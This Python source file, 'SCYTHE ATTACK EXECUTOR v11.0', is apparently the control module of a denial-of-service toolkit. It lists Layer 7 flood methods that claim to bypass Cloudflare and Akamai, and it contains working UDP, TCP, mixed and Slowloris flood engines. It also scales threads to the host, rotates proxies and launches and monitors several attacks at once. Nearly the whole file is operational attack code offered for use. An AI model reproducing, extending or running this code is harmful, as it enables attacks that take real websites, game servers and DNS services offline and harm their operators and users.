#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SCYTHE ATTACK EXECUTOR v11.0 — 6 L7 + 4 L4 METHODS + CLOUDSCRAPER
"""
import os
import sys
import time
import json
import re
import subprocess
import threading
import socket
import random
from datetime import datetime

try:
    from state_manager import state, MAX_CONCURRENT, MAX_HOLD_TIME
except ImportError as e:
    print("[FATAL] state_manager.py not found.")
    sys.exit(1)

# ─── METHODS DATABASE (6 L7 + 4 L4) ───
METHODS = {
    # LAYER 7
    "httpbypass":  {"layer": 7, "type": "py", "engine": "l7", "desc": "CF bypass + header spoofing", "target": "Cloudflare, Akamai"},
    "cf-flood":    {"layer": 7, "type": "py", "engine": "l7", "desc": "CF header manipulation + cache bypass", "target": "Cloudflare"},
    "slow":        {"layer": 7, "type": "py", "engine": "l7", "desc": "Slowloris connection hold", "target": "Apache, nginx"},
    "httpget":     {"layer": 7, "type": "py", "engine": "l7", "desc": "Standard GET flood with random paths", "target": "Any HTTP server"},
    "httpflood":   {"layer": 7, "type": "py", "engine": "l7", "desc": "Keep-alive connections, multiple requests", "target": "Load balancers"},
    "auto":        {"layer": 7, "type": "py", "engine": "l7", "desc": "Auto-switch methods (adaptive)", "target": "Any"},
    # LAYER 4
    "udp":         {"layer": 4, "type": "py", "engine": "l4", "desc": "UDP datagram flood", "target": "Game servers, DNS"},
    "tcp":         {"layer": 4, "type": "py", "engine": "l4", "desc": "TCP SYN flood", "target": "Web servers"},
    "mixed":       {"layer": 4, "type": "py", "engine": "l4", "desc": "UDP + TCP mixed flood", "target": "Firewalls, generic"},
    "slowloris":   {"layer": 4, "type": "py", "engine": "l4", "desc": "TCP connection hold (Slowloris at L4)", "target": "Apache, nginx"},
}

# ─── VPS SPECS ───
def get_vps_specs():
    try:
        with open('/proc/cpuinfo', 'r') as f:
            cpu_count = f.read().count('processor\t:')
    except:
        cpu_count = os.cpu_count() or 1
    try:
        with open('/proc/meminfo', 'r') as f:
            for line in f:
                if line.startswith('MemTotal:'):
                    ram_kb = int(line.split()[1])
                    ram_gb = ram_kb / (1024 * 1024)
                    break
    except:
        ram_gb = 1.0
    try:
        stat = os.statvfs('/')
        disk_gb = (stat.f_blocks * stat.f_frsize) / (1024**3)
    except:
        disk_gb = 10.0
    return cpu_count, ram_gb, disk_gb

def calculate_rps_estimate(proxy_count, concurrent_attacks):
    cpu_count, ram_gb, _ = get_vps_specs()
    base_rps_per_core_l7 = 8000
    base_rps_per_core_l4 = 20000
    ram_factor = min(ram_gb / (concurrent_attacks * 0.2 + 0.1), 1.0)
    cpu_available = cpu_count / max(concurrent_attacks, 1)
    cpu_factor_l7 = min(cpu_available / 0.3, 1.0)
    cpu_factor_l4 = min(cpu_available / 0.1, 1.0)
    proxy_rps = proxy_count * 150
    l7_rps = int(base_rps_per_core_l7 * cpu_count * cpu_factor_l7 * ram_factor)
    l4_rps = int(base_rps_per_core_l4 * cpu_count * cpu_factor_l4 * ram_factor)
    l7_rps = min(l7_rps, proxy_rps)
    l4_rps = min(l4_rps, proxy_rps)
    return l7_rps, l4_rps

def get_adaptive_threads(method, duration):
    cpu_count, ram_gb, _ = get_vps_specs()
    if method in ['httpbypass', 'cf-flood', 'slow', 'httpget', 'httpflood', 'auto']:
        base_per_core = 150
    elif method in ['udp', 'tcp', 'mixed', 'slowloris']:
        base_per_core = 500
    else:
        base_per_core = 200
    duration_factor = min(2.0, 60 / max(duration, 10))
    threads = int(cpu_count * base_per_core * duration_factor)
    threads = max(50, min(threads, 5000))
    return threads

# ─── L4 ENGINE (Built-in, simple) ───
class L4AttackEngine:
    def __init__(self, target, port, duration, threads, method_type="udp"):
        self.target = target
        self.port = int(port)
        self.duration = int(duration)
        self.threads = int(threads)
        self.method_type = method_type.lower()
        self.running = False
        self.total_requests = 0
        self.total_bytes = 0
        self.counter_lock = threading.Lock()
        self.start_time = 0
        self.end_time = 0

    def _udp_worker(self):
        end_time = self.end_time
        local_count = 0
        local_bytes = 0
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while self.running and time.time() < end_time:
            try:
                data = random._urandom(random.randint(64, 2048))
                sock.sendto(data, (self.target, self.port))
                local_count += 1
                local_bytes += len(data)
            except:
                pass
        sock.close()
        with self.counter_lock:
            self.total_requests += local_count
            self.total_bytes += local_bytes

    def _tcp_worker(self):
        end_time = self.end_time
        local_count = 0
        while self.running and time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.target, self.port))
                sock.sendall(random._urandom(random.randint(64, 1024)))
                sock.close()
                local_count += 1
            except:
                pass
        with self.counter_lock:
            self.total_requests += local_count

    def _mixed_worker(self):
        end_time = self.end_time
        local_count = 0
        while self.running and time.time() < end_time:
            try:
                if random.random() > 0.5:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.sendto(random._urandom(1024), (self.target, self.port))
                    sock.close()
                else:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((self.target, self.port))
                    sock.close()
                local_count += 1
            except:
                pass
        with self.counter_lock:
            self.total_requests += local_count

    def _slowloris_worker(self):
        end_time = self.end_time
        local_count = 0
        connections = []
        while self.running and time.time() < end_time:
            try:
                while len(connections) < 50 and self.running:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((self.target, self.port))
                    sock.sendall(f"GET / HTTP/1.1\r\nHost: {self.target}\r\n".encode())
                    connections.append({'sock': sock, 'last': time.time()})
                    local_count += 1
                for conn in connections[:]:
                    if time.time() - conn['last'] > 10:
                        try:
                            conn['sock'].sendall(f"X-{random.randint(1,9999)}: A\r\n".encode())
                            conn['last'] = time.time()
                        except:
                            connections.remove(conn)
                time.sleep(0.5)
            except:
                pass
        for conn in connections:
            try: conn['sock'].close()
            except: pass
        with self.counter_lock:
            self.total_requests += local_count

    def _rps_reporter(self):
        last_total = 0
        last_time = time.time()
        while self.running:
            time.sleep(1)
            with self.counter_lock:
                current_total = self.total_requests
            elapsed = time.time() - last_time
            rps = int((current_total - last_total) / elapsed) if elapsed > 0 else 0
            print(f"RPS: {rps} | Total: {current_total} | L4: {self.method_type.upper()}", flush=True)
            sys.stdout.flush()
            last_total = current_total
            last_time = time.time()

    def start(self):
        self.running = True
        self.start_time = time.time()
        self.end_time = self.start_time + self.duration
        print(f"\n[Scythe L4] {self.method_type.upper()} attack launched", flush=True)
        print(f"Target: {self.target}:{self.port} | Duration: {self.duration}s | Threads: {self.threads}", flush=True)
        print(f"{'='*60}\n", flush=True)
        sys.stdout.flush()

        reporter = threading.Thread(target=self._rps_reporter, daemon=True)
        reporter.start()

        worker_map = {
            'udp': self._udp_worker,
            'tcp': self._tcp_worker,
            'mixed': self._mixed_worker,
            'slowloris': self._slowloris_worker,
        }
        worker_func = worker_map.get(self.method_type, self._udp_worker)
        thread_pool = []
        for _ in range(self.threads):
            t = threading.Thread(target=worker_func, daemon=True)
            t.start()
            thread_pool.append(t)
        time.sleep(self.duration)
        self.running = False
        for t in thread_pool:
            t.join(timeout=2)
        with self.counter_lock:
            final_total = self.total_requests
            final_bytes = self.total_bytes
        elapsed = time.time() - self.start_time
        avg_rps = int(final_total / elapsed) if elapsed > 0 else 0
        print(f"\n[Scythe L4] Attack completed!", flush=True)
        print(f"Total: {final_total:,} | Avg RPS: {avg_rps:,} | Bytes: {final_bytes:,}", flush=True)
        print(f"{'='*60}\n", flush=True)
        sys.stdout.flush()
        return final_total, avg_rps, final_bytes

# ─── ATTACK EXECUTOR ───
class AttackExecutor:
    def __init__(self):
        self.processes = {}
        self.proxy_running = False
        self.lock = threading.Lock()
        self._rps_regex = re.compile(r'RPS:\s*(\d+)', re.IGNORECASE)
        self._total_regex = re.compile(r'Total:\s*(\d+)', re.IGNORECASE)
        self._bytes_regex = re.compile(r'Bytes:\s*(\d+)', re.IGNORECASE)

    def start_proxy_refresh(self):
        if self.proxy_running:
            return
        self.proxy_running = True
        def refresh():
            while self.proxy_running:
                try:
                    subprocess.run(["python3", "getproxy.py"], capture_output=True, text=True, timeout=15)
                except:
                    pass
                time.sleep(7)
        t = threading.Thread(target=refresh, daemon=True)
        t.start()

    def stop_proxy_refresh(self):
        self.proxy_running = False

    def get_proxy_count(self):
        try:
            if os.path.exists("proxies.txt"):
                with open("proxies.txt", 'r') as f:
                    return len([l for l in f if l.strip()])
        except:
            pass
        return 0

    def get_attack_info(self, method, target, port, duration, hold_time):
        info = METHODS.get(method, {})
        threads = get_adaptive_threads(method, int(duration))
        proxy_count = self.get_proxy_count()
        l7_rps, l4_rps = calculate_rps_estimate(proxy_count, len(state.state["active_attacks"]) + 1)
        est_rps = l7_rps if info.get("layer") == 7 else l4_rps
        return {
            "method": method,
            "target": target,
            "port": port,
            "duration": duration,
            "hold_time": hold_time or duration,
            "threads": threads,
            "proxy_count": proxy_count,
            "est_rps": est_rps,
            "layer": info.get("layer", 7),
            "desc": info.get("desc", ""),
        }

    def execute(self, method, target, port, duration, hold_time=None):
        try:
            duration = int(duration)
        except:
            print("[ERROR] Invalid duration")
            return False

        if method not in METHODS:
            print(f"[ERROR] Unknown method: {method}")
            return False

        info = METHODS[method]
        layer = info["layer"]

        self.start_proxy_refresh()
        proxy_count = self.get_proxy_count()
        threads = get_adaptive_threads(method, duration)
        l7_rps, l4_rps = calculate_rps_estimate(proxy_count, len(state.state["active_attacks"]) + 1)
        rps_estimate = l7_rps if layer == 7 else l4_rps

        actual_hold = int(hold_time) if hold_time else min(duration, MAX_HOLD_TIME)
        actual_hold = min(actual_hold, MAX_HOLD_TIME)

        if layer == 7 and not target.startswith("http"):
            target = "https://" + target

        # Add to state
        success, result = state.add_attack(
            f"{target}:{port}", method, duration, layer, proxy_count, actual_hold, threads
        )
        if not success:
            print(f"[ERROR] {result}")
            return False

        attack_id = result
        print(f"\n[+] Attack ID: {attack_id}")
        print(f"    Threads: {threads} | Est. RPS: ~{rps_estimate} | Proxies: {proxy_count}")

        try:
            script_dir = os.path.dirname(os.path.abspath(__file__))
            if layer == 7:
                engine_path = os.path.join(script_dir, "methods", "l7_engine.py")
                if not os.path.exists(engine_path):
                    print(f"[ERROR] l7_engine.py not found at: {engine_path}")
                    state.remove_attack(attack_id)
                    return False

                # Proxy file path
                proxy_file_path = os.path.join(script_dir, "proxies.txt")
                if not os.path.exists(proxy_file_path):
                    proxy_file_path = os.path.join(os.path.dirname(script_dir), "proxies.txt")
                proxy_file_path = os.path.abspath(proxy_file_path)

                cmd = [sys.executable, engine_path, method, target, str(duration), str(threads), proxy_file_path]
                env = os.environ.copy()
                env['PYTHONUNBUFFERED'] = '1'

                proc = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    bufsize=1,
                    universal_newlines=True,
                    cwd=script_dir,
                    env=env
                )
                # Update state with PID
                for attack in state.state["active_attacks"]:
                    if attack["id"] == attack_id:
                        attack["pid"] = proc.pid
                        break
                state._save()

                with self.lock:
                    self.processes[attack_id] = proc

                # Start monitor
                monitor = threading.Thread(
                    target=self._monitor_attack,
                    args=(attack_id, proc, duration, actual_hold, method)
                )
                monitor.daemon = True
                monitor.start()
                return True
            else:
                # L4 engine (built-in, but we'll run in thread with queue)
                import queue
                rps_queue = queue.Queue()
                def l4_thread():
                    engine = L4AttackEngine(target, port, duration, threads, method)
                    def new_reporter():
                        last_total = 0
                        last_time = time.time()
                        while engine.running:
                            time.sleep(1)
                            with engine.counter_lock:
                                current_total = engine.total_requests
                            elapsed = time.time() - last_time
                            rps = int((current_total - last_total) / elapsed) if elapsed > 0 else 0
                            rps_queue.put((rps, current_total, engine.total_bytes))
                            print(f"RPS: {rps} | Total: {current_total} | L4: {engine.method_type.upper()}", flush=True)
                            sys.stdout.flush()
                            last_total = current_total
                            last_time = time.time()
                    engine._rps_reporter = new_reporter
                    engine.start()
                t = threading.Thread(target=l4_thread, daemon=True)
                t.start()
                with self.lock:
                    self.processes[attack_id] = t

                def l4_monitor():
                    start = time.time()
                    peak_rps = 0
                    total_requests = 0
                    total_bytes = 0
                    last_rps = 0
                    while True:
                        try:
                            rps, total, bytes_sent = rps_queue.get(timeout=2)
                            last_rps = rps
                            peak_rps = max(peak_rps, rps)
                            total_requests = total
                            total_bytes += bytes_sent
                            proxy_count = self.get_proxy_count()
                            state.update_rps(attack_id, last_rps, total_requests, peak_rps, proxy_count, total_bytes)
                            elapsed = time.time() - start
                            if elapsed >= max(duration, actual_hold):
                                break
                        except queue.Empty:
                            elapsed = time.time() - start
                            if elapsed >= max(duration, actual_hold):
                                break
                            continue
                    state.remove_attack(attack_id)
                    with self.lock:
                        if attack_id in self.processes:
                            del self.processes[attack_id]
                    print(f"\n[+] L4 Attack {attack_id[:12]}... completed.")
                    print(f"    Total: {total_requests:,} | Peak RPS: {peak_rps:,} | Bytes: {total_bytes:,}")
                l4_mon = threading.Thread(target=l4_monitor, daemon=True)
                l4_mon.start()
                return True

        except Exception as e:
            print(f"[ERROR] Failed to launch: {e}")
            import traceback
            traceback.print_exc()
            state.remove_attack(attack_id)
            return False

    def _monitor_attack(self, attack_id, proc, duration, hold_time, method):
        start = time.time()
        peak_rps = 0
        total_requests = 0
        total_bytes = 0
        last_rps = 0
        try:
            for line in iter(proc.stdout.readline, ''):
                if not line:
                    break
                line = line.strip()
                if not line:
                    continue
                parsed_rps, parsed_total, parsed_bytes = self._parse_rps_from_line(line)
                if parsed_rps > 0:
                    last_rps = parsed_rps
                    peak_rps = max(peak_rps, parsed_rps)
                if parsed_total > 0:
                    total_requests = parsed_total
                if parsed_bytes > 0:
                    total_bytes += parsed_bytes
                elapsed = time.time() - start
                proxy_count = self.get_proxy_count()
                state.update_rps(attack_id, last_rps, total_requests, peak_rps, proxy_count, total_bytes)
                if elapsed >= max(duration, hold_time):
                    proc.terminate()
                    break
        except Exception as e:
            print(f"[WARN] Monitor error: {e}")
        # Cleanup
        try:
            stderr_data = proc.stderr.read()
            if stderr_data:
                stderr_lines = stderr_data.strip().split('\n')[-5:]
                for line in stderr_lines:
                    if line.strip():
                        print(f"[DEBUG] {line.strip()}")
        except:
            pass
        try:
            proc.wait(timeout=5)
        except:
            proc.kill()
        elapsed = time.time() - start
        # Final state update
        for attack in state.state["active_attacks"]:
            if attack["id"] == attack_id:
                attack["peak_rps"] = peak_rps
                attack["total_requests"] = total_requests
                attack["total_bytes"] = total_bytes
                break
        state.remove_attack(attack_id)
        with self.lock:
            if attack_id in self.processes:
                del self.processes[attack_id]
        print(f"\n[+] Attack {attack_id[:12]}... completed:")
        print(f"    Total: {total_requests:,} | Peak RPS: {peak_rps:,} | Bytes: {total_bytes:,}")
        print(f"    Duration: {elapsed:.1f}s\n")

    def _parse_rps_from_line(self, line):
        rps = 0
        total = 0
        bytes_sent = 0
        m = self._rps_regex.search(line)
        if m:
            rps = int(m.group(1))
        m = self._total_regex.search(line)
        if m:
            total = int(m.group(1))
        m = self._bytes_regex.search(line)
        if m:
            bytes_sent = int(m.group(1))
        return rps, total, bytes_sent

    def stop_attack(self, attack_id):
        with self.lock:
            if attack_id in self.processes:
                proc = self.processes[attack_id]
                try:
                    if hasattr(proc, 'terminate'):
                        proc.terminate()
                        proc.kill()
                except:
                    pass
                state.remove_attack(attack_id)
                return True
        return False

    def stop_all(self):
        with self.lock:
            for aid in list(self.processes.keys()):
                try:
                    proc = self.processes[aid]
                    if hasattr(proc, 'terminate'):
                        proc.terminate()
                        proc.kill()
                except:
                    pass
            self.processes.clear()
        state.stop_all()

if __name__ == '__main__':
    print("Scythe ATTACK EXECUTOR v11.0")
    print(f"Methods: {len(METHODS)} (6 L7 + 4 L4)")
    cpu, ram, disk = get_vps_specs()
    print(f"VPS: {cpu} cores | {round(ram,1)}GB RAM | {round(disk,1)}GB disk")
    print(f"Proxy count: {AttackExecutor().get_proxy_count()}")